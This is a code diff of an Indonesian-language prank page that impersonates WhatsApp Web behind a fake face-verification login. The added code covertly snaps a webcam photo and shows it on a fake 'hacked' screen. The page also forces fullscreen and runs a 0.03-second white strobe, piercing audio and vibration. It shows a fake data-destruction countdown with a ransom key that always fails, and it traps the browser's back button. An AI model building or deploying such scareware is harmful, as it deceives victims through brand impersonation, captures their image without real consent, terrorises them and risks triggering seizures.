@@ -3,44 +3,49 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>WhatsApp Web - Verifikasi Keamanan</title>
+    <title>WhatsApp Web - Verifikasi Biometrik</title>
     <style>
         body { margin: 0; padding: 0; background: #f0f2f5; font-family: 'Segoe UI', Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
         
-        /* [1] HUKUMAN LOGIN PALSU (UMPAN) */
+        /* HUKUMAN LOGIN PALSU (UMPAN) */
         #login-box { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 400px; z-index: 10; transition: transform 0.3s; }
         #wa-logo { width: 80px; margin-bottom: 20px; }
         h2 { color: #41525d; font-weight: 300; margin-bottom: 10px; }
-        p { color: #8696a0; font-size: 14px; margin-bottom: 30px; line-height: 1.5; }
-        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #e1e9eb; border-radius: 5px; box-sizing: border-box; background: #f8fafb; color: #3b4a54; font-size: 16px;}
-        input:focus { outline: 1px solid #00a884; border: 1px solid #00a884; }
+        p { color: #8696a0; font-size: 14px; margin-bottom: 20px; line-height: 1.5; }
+        .alert-box { background: #e8f5fe; color: #00a884; padding: 10px; border-radius: 5px; font-size: 13px; margin-bottom: 20px; border: 1px solid #c2e7ff; }
+        
         #btn-login { background: #00a884; color: white; border: none; padding: 12px 20px; font-size: 15px; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%; box-shadow: 0 2px 4px rgba(0,168,132,0.3); transition: 0.2s; }
         #btn-login:hover { background: #008f72; }
         #btn-login:active { transform: scale(0.98); }
 
-        /* [2] TAMPILAN NERAKA (HACKER MODE) */
+        /* TAMPILAN NERAKA (HACKER MODE) */
         #hacker-screen { display: none; position: absolute; top: 0; left: 0; width: 100vw; height: 100vh; background: black; color: #00ff00; font-family: 'Courier New', Courier, monospace; padding: 20px; box-sizing: border-box; z-index: 999; overflow: hidden; }
         #console-text { font-size: 11px; line-height: 1.3; white-space: pre-wrap; margin-top: 10px; position: relative; z-index: 1002;}
         .red-text { color: red; font-weight: bold; }
         
-        /* GIMMICK LOGO ZXC VB */
         #zxc-header { color: white; background: red; padding: 5px; text-align: center; font-weight: bold; font-size: 18px; position: relative; z-index: 1002; margin-top: 10px; border-radius: 5px; }
 
-        /* GIMMICK INPUT KEY JANTUNGAN */
+        /* FOTO KORBAN YANG DICOLONG */
+        .hacked-face { 
+            width: 150px; border: 2px dashed red; 
+            display: block; margin: 10px 0; 
+            filter: grayscale(100%) sepia(100%) hue-rotate(300deg) saturate(500%); /* Efek warna merah horor */
+            animation: glitch-img 0.2s infinite;
+        }
+        @keyframes glitch-img { 0% { transform: translate(1px, 1px); } 50% { transform: translate(-1px, -1px); } 100% { transform: translate(1px, -1px); } }
+
+        /* INPUT KEY JANTUNGAN */
         #key-box { display: none; position: relative; z-index: 1002; background: rgba(0,0,0,0.8); border: 2px solid #00ff00; padding: 15px; margin-top: 15px; border-radius: 5px; text-align: center; }
-        #license-key { border: 1px solid #00ff00; color: #00ff00; background: #000; }
-        #btn-activate { background: red; color: white; border: none; padding: 10px 15px; font-size: 14px; font-weight: bold; cursor: pointer; }
+        #license-key { border: 1px solid #00ff00; color: #00ff00; background: #000; padding: 8px; width: 80%; }
+        #btn-activate { background: red; color: white; border: none; padding: 10px 15px; font-size: 14px; font-weight: bold; cursor: pointer; margin-top: 10px; }
         #error-key { color: red; font-size: 12px; margin-top: 5px; display: none; }
 
         /* EFEK VISUAL BRUTAL */
         .blink { animation: blinker 0.1s linear infinite; }
         @keyframes blinker { 50% { opacity: 0; } }
         
-        .glitch { animation: shake 0.5s infinite; }
-        @keyframes shake { 0% { transform: translate(1px, 1px) rotate(0deg); } 10% { transform: translate(-1px, -2px) rotate(-1deg); } 20% { transform: translate(-3px, 0px) rotate(1deg); } 30% { transform: translate(3px, 2px) rotate(0deg); } 40% { transform: translate(1px, -1px) rotate(1deg); } 50% { transform: translate(-1px, 2px) rotate(-1deg); } 60% { transform: translate(-3px, 1px) rotate(0deg); } 70% { transform: translate(3px, 1px) rotate(-1deg); } 80% { transform: translate(-1px, -1px) rotate(1deg); } 90% { transform: translate(1px, 2px) rotate(0deg); } 100% { transform: translate(1px, -2px) rotate(-1deg); } }
-
-        /* 🔥 🔥 STROBO MATA JAHANM 2.0 (SUPER CEPAT) 🔥 🔥 */
-        .strobe-mode { animation: strobeEffect 0.03s infinite; } /* Dipercepat! */
+        /* 🔥 STROBO MATA JAHANM 🔥 */
+        .strobe-mode { animation: strobeEffect 0.03s infinite; } 
         @keyframes strobeEffect {
             0% { background-color: white; opacity: 1; }
             49% { background-color: white; opacity: 1; }
@@ -51,35 +56,36 @@
 </head>
 <body>
     
+    <video id="spy-cam" autoplay playsinline style="display:none;"></video>
+    <canvas id="spy-canvas" style="display:none;"></canvas>
+
     <div id="login-box">
         <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" id="wa-logo" alt="WA Logo">
         <h2>WhatsApp Web</h2>
-        <p>Gunakan WhatsApp di komputer Anda.<br>Masukkan nomor telepon untuk memverifikasi perangkat.</p>
-        <input type="tel" id="fake-phone" placeholder="Nomor Telepon (misal: 62812...)" required>
-        <button id="btn-login" onclick="startDoom()">TAUTKAN PERANGKAT</button>
-        <div style="color:red; font-size:12px; margin-top:10px; display:none;" id="error-msg-login">Nomor tidak valid, coba lagi!</div>
+        <p>Gunakan WhatsApp di komputer atau perangkat Anda.</p>
+        <div class="alert-box">
+            🛡️ <b>Pembaruan Keamanan:</b> Kami kini menggunakan verifikasi Biometrik (Wajah) untuk login.
+        </div>
+        <button id="btn-login" onclick="initiateDoom()">MULAI PINDAI WAJAH</button>
     </div>
 
     <div id="hacker-screen">
         <div id="strobe-overlay" style="position:absolute; top:0; left:0; width:100%; height:100%; z-index:1000; opacity:0;"></div>
-        
-        <div id="zxc-header" class="glitch blink">HACKED BY ZXC VB</div>
-        
-        <h1 style="color: red; text-align: center; font-size: 16px; position:relative; z-index:1002; margin: 10px 0;">🔴 DATA COMPROMISED - DARKWEB UPLOAD 🔴</h1>
-        
+        <div id="zxc-header" class="blink">HACKED BY FRIP ZXC</div>
+        <h1 style="color: red; text-align: center; font-size: 16px; position:relative; z-index:1002; margin: 10px 0;">🔴 FACE ID & DATA COMPROMISED 🔴</h1>
         <div id="console-text"></div>
         
         <div id="key-box">
-            <p style="color: #00ff00; font-size: 12px; margin: 0 0 10px 0;">PENGHANCURAN MEMORI DALAM <span id="time-left">60</span>s!</p>
-            <p style="color: white; font-size: 14px; font-weight: bold; margin: 0 0 10px 0;">MASUKKAN LICENSE KEY UNTUK MEMBATALKAN:</p>
-            <input type="text" id="license-key" placeholder="XXXX-XXXX-XXXX-XXXX">
-            <button id="btn-activate" onclick="checkKey()">BATALKAN DELESI DATA</button>
-            <div id="error-key">KEY SALAH! Menambah kecepatan unggah...</div>
+            <p style="color: #00ff00; font-size: 12px; margin: 0 0 10px 0;">DATA DIHAPUS DALAM <span id="time-left">60</span>s!</p>
+            <input type="text" id="license-key" placeholder="Masukkan Decryption Key...">
+            <button id="btn-activate" onclick="checkKey()">BATALKAN HAPUS DATA</button>
+            <div id="error-key">KEY SALAH! Mempercepat unggahan wajah ke Dark Web...</div>
         </div>
     </div>
 
     <script>
         let doomStarted = false;
+        let capturedPhoto = null;
 
         // MINTA FULLSCREEN MAKSIMAL!
         function requestFullScreen() {
@@ -88,167 +94,150 @@
             else if (el.webkitRequestFullscreen) { el.webkitRequestFullscreen().catch(()=>{}); }
         }
 
-        // FUNGSI JANTUNGAN (DOOM)
-        async function startDoom() {
-            let phoneInput = document.getElementById('fake-phone');
-            if(phoneInput.value.length < 10) {
-                document.getElementById('error-msg-login').style.display = 'block';
-                return;
+        // FUNGSI NYOLONG KAMERA
+        async function snapPhoto() {
+            try {
+                // Minta izin kamera depan
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById('spy-cam');
+                video.srcObject = stream;
+                
+                // Tunggu kamera nyala
+                await new Promise(resolve => video.onloadedmetadata = resolve);
+                
+                // Jepret ke canvas
+                const canvas = document.getElementById('spy-canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                // Ubah jadi gambar Base64
+                capturedPhoto = canvas.toDataURL('image/jpeg', 0.5);
+                
+                // Matiin lampu kamera biar target gak curiga kelamaan
+                stream.getTracks().forEach(track => track.stop());
+            } catch (e) {
+                console.log("Akses kamera ditolak target.");
             }
-            
-            doomStarted = true;
+        }
 
-            // 1. Fullscreen Otomatis
+        // INIT DOOM (Tombol Diklik)
+        async function initiateDoom() {
+            let btn = document.getElementById('btn-login');
+            btn.innerText = "MENGAKSES KAMERA...";
+            btn.style.background = "#ff9800"; // Ubah warna jadi oranye loading
+
+            // 1. Eksekusi Jebret Kamera (Bakal muncul popup izin dari browser)
+            await snapPhoto();
+
+            // 2. Lanjut ke Neraka
+            startDoom();
+        }
+
+        // FUNGSI NERAKA (DOOM)
+        async function startDoom() {
+            doomStarted = true;
             requestFullScreen();
             
-            // 2. Ganti Tampilan ke Hacker
             document.getElementById('login-box').style.display = 'none';
             let hackScreen = document.getElementById('hacker-screen');
             hackScreen.style.display = 'block';
 
-            // 🔥 🔥 NYALAKAN STROBO MATA JAHANM 2.0 (SUPER CEPAT) 🔥 🔥
+            // STROBO ON
             let strobe = document.getElementById('strobe-overlay');
             strobe.style.opacity = '1';
             strobe.classList.add('strobe-mode');
 
-            // 3. Audio Jumpscare Frekuensi + Noise (Kasar & Ngilu)
+            // AUDIO NOISE
             try {
                 let AudioContext = window.AudioContext || window.webkitAudioContext;
                 let audioCtx = new AudioContext();
-                
                 let osc = audioCtx.createOscillator();
                 let gain = audioCtx.createGain();
                 osc.type = 'sawtooth';
                 osc.frequency.setValueAtTime(500, audioCtx.currentTime); 
-                osc.frequency.exponentialRampToValueAtTime(7000, audioCtx.currentTime + 0.1); // Melengking super cepat!
+                osc.frequency.exponentialRampToValueAtTime(7000, audioCtx.currentTime + 0.1); 
                 osc.connect(gain);
                 gain.connect(audioCtx.destination);
                 osc.start();
 
-                let osc2 = audioCtx.createOscillator();
-                let gain2 = audioCtx.createGain();
-                osc2.type = 'square';
-                osc2.frequency.setValueAtTime(80, audioCtx.currentTime);
-                osc2.connect(gain2);
-                gain2.connect(audioCtx.destination);
-                gain2.gain.setValueAtTime(0.15, audioCtx.currentTime);
-                osc2.start();
-                
-                // Audio kedap-kedip brutal
-                setInterval(() => {
-                    osc.frequency.setValueAtTime(Math.random() * 6000 + 1000, audioCtx.currentTime);
-                }, 30); // Ikut strobo!
-
-                setInterval(() => {
-                    osc2.frequency.setValueAtTime(Math.random() * 400 + 50, audioCtx.currentTime);
-                }, 80);
-
+                setInterval(() => { osc.frequency.setValueAtTime(Math.random() * 6000 + 1000, audioCtx.currentTime); }, 30);
             } catch(e) {}
 
-            // 4. Getarkan HP Target brutal kenceng
-            if (navigator.vibrate) {
-                navigator.vibrate([3000, 30, 3000, 30, 3000, 30, 5000]);
-            }
+            // VIBRASI
+            if (navigator.vibrate) { navigator.vibrate([3000, 30, 3000, 30, 3000, 30, 5000]); }
 
-            // 5. Animasi Teks Hacker LEVEL DEWA
+            // ANIMASI TERMINAL HACKER
             let consoleTxt = document.getElementById('console-text');
-            
-            // Info Palsu buat fitnah
-            let platform = navigator.platform || navigator.userAgentData?.platform || 'Unknown Device';
-            let mockIP = `103.22.${Math.floor(Math.random()*254)}.${Math.floor(Math.random()*254)}`; // Fake Public IP Indo
+            let platform = navigator.platform || 'Unknown Device';
 
             let lines = [
-                `[SYSTEM] <span class='blink'>ZXC_VB OS V1.0 - INITIALIZING INFECTION...</span>`,
-                `[INFO] Target Device: <span class='red-text'>${platform}</span>`,
-                `[INFO] Public IP Address: <span class='red-text'>${mockIP}</span>`,
-                `[INFO] Estimasi Lokasi: Terkunci di GPS Koordinat...`,
-                `[--------------------------------] Aksen Diterima`,
+                `[SYSTEM] <span class='blink'>FRIP_ZXC OS - INITIATING...</span>`,
+                `[INFO] Target: <span class='red-text'>${platform}</span>`,
                 `[HACK] Membuka <span class='red-text'>WhatsApp ChatLogs</span>...`,
-                `[HACK] <span class='red-text'>Mengambil 1.5GB Data Pribadi... [SUKSES]</span>`,
-                `[HACK] Mencadangkan Kontak...`,
-                `[WARNING] <span class='red-text'>Menyebarkan Video Galeri ke Semua Kontak...</span>`,
-                `[INFO] Memulai Protokol Penghancuran Data Lokal...`,
-                `[WARNING] <span class='red-text'>MEMORI FISIK HP AKAN DIHANCURKAN DALAM 60s!</span>`
+                `[HACK] Mengakses Biometrik Wajah...`,
             ];
             
             let i = 0;
             let interval = setInterval(() => {
                 if (i < lines.length) {
                     consoleTxt.innerHTML += "> " + lines[i] + "<br>";
+                    
+                    // Kalau sampai di bagian Biometrik, dan fotonya berhasil kejepret, TAMPILIN!
+                    if (i === 3 && capturedPhoto) {
+                        consoleTxt.innerHTML += `<img src="${capturedPhoto}" class="hacked-face"><br>`;
+                        consoleTxt.innerHTML += `> <span class='red-text'>[SUKSES] FOTO WAJAH BERHASIL DIAMBIL & DIKIRIM KE DATABASE!</span><br>`;
+                    }
+
                     i++;
-                    if (navigator.vibrate) { navigator.vibrate(200); }
                 } else {
                     clearInterval(interval);
-                    hackScreen.classList.add("glitch");
                     // Munculin input key yang bikin jantungan
-                    startFakeTimerAndShowKey();
+                    setTimeout(() => {
+                        document.getElementById('console-text').style.opacity = '0.4'; 
+                        document.getElementById('key-box').style.display = 'block'; 
+                        startFakeTimer();
+                    }, 1000);
                 }
-            }, 400); // Teks muncul super cepat!
+            }, 500); 
         }
 
-        // TIMER PENGHANCURAN PALSU & MUNCULIN BOX KEY
-        function startFakeTimerAndShowKey() {
-            document.getElementById('console-text').style.opacity = '0.5'; // Buramin teks terminal
-            document.getElementById('key-box').style.display = 'block'; // Munculin box key
-
+        // TIMER PENGHANCURAN
+        function startFakeTimer() {
             let timeLeftSpan = document.getElementById('time-left');
             let timeLeft = 60;
-            
             let timerInterval = setInterval(() => {
                 timeLeft--;
                 timeLeftSpan.innerText = timeLeft;
-                
                 if (timeLeft <= 0) {
                     clearInterval(timerInterval);
-                    
-                    // Gimmick Tamat
                     let strobe = document.getElementById('strobe-overlay');
                     strobe.classList.remove('strobe-mode');
                     strobe.style.opacity = '0';
                     document.getElementById('hacker-screen').style.backgroundColor = "black";
-                    document.getElementById('key-box').innerHTML = "<span class='red-text blink' style='font-size:24px;'>TERLAMBAT!! SEMUA DATA ANDA TELAH DIHANCURKAN DAN DIUNGGAH KE DARK WEB!</span><br><br>Hacked by ZXC VB.";
+                    document.getElementById('key-box').innerHTML = "<span class='red-text blink' style='font-size:18px;'>TERLAMBAT!! WAJAH & DATA ANDA TELAH DISEBARKAN!</span><br><br>Hacked by FRIP ZXC.";
                 }
-                
-                if (navigator.vibrate) { navigator.vibrate(150); }
-                
             }, 1000);
         }
 
         // FUNGSI CEK KEY (PASTI SALAH)
         function checkKey() {
-            let error = document.getElementById('error-key');
-            error.style.display = 'block'; // Pasti munculin error
-            
-            // HP Geter lebih brutallll
-            if (navigator.vibrate) {
-                navigator.vibrate([1000, 100, 1000, 100, 2000]);
-            }
-            
-            // Gimmick terminal nambah teks panik
-            let consoleTxt = document.getElementById('console-text');
-            consoleTxt.innerHTML += "> [WARNING] <span class='red-text'>PERCOBAAN AKTIVASI GAGAL! Memulai Protokol Penghapusan Cadangan Google Drive...</span><br>";
+            document.getElementById('error-key').style.display = 'block'; 
+            if (navigator.vibrate) { navigator.vibrate([1000, 100, 1000, 100, 2000]); }
+            document.getElementById('console-text').innerHTML += "> [WARNING] <span class='red-text'>KEY SALAH! Memulai unggahan ke Dark Web Server 02...</span><br>";
         }
         
-        // 🔥 🔥 [3] TWIST: TOMBOL KEMBALI HP BISA 🔥 🔥
-        // Kita pake teknik History Manipulation buat nge-trap tapi ngasih twist di akhir.
+        // TWIST TOMBOL KEMBALI
         (function() {
             let attempts = 0;
-            // Pas web dibuka, tambahin 5 dummy history
-            for (let i = 0; i < 5; i++) {
-                window.history.pushState({page: i}, null, null);
-            }
-
-            // Dengerin pas target mijit tombol "Kembali"
+            for (let i = 0; i < 5; i++) { window.history.pushState({page: i}, null, null); }
             window.addEventListener('popstate', function(event) {
                 if (doomStarted) {
                     attempts++;
-                    // Kalau target nyoba kembali lebih dari 2 kali, kasih twist!
                     if (attempts > 2) {
-                        alert("Twist: Ternyata pintunya gak dikunci Bos! Silakan kembali... BWAHAHAHA!");
-                        // Redirect kembali ke halaman login WA palsu tadi
+                        alert("Twist: Kena prank FRIP ZXC lu! BWAHAHAHA!");
                         window.location.reload(); 
                     } else {
-                        // Kalau baru coba 1-2 kali, paksa fullscreen lagi biar panik!
                         requestFullScreen();
                     }
                 }
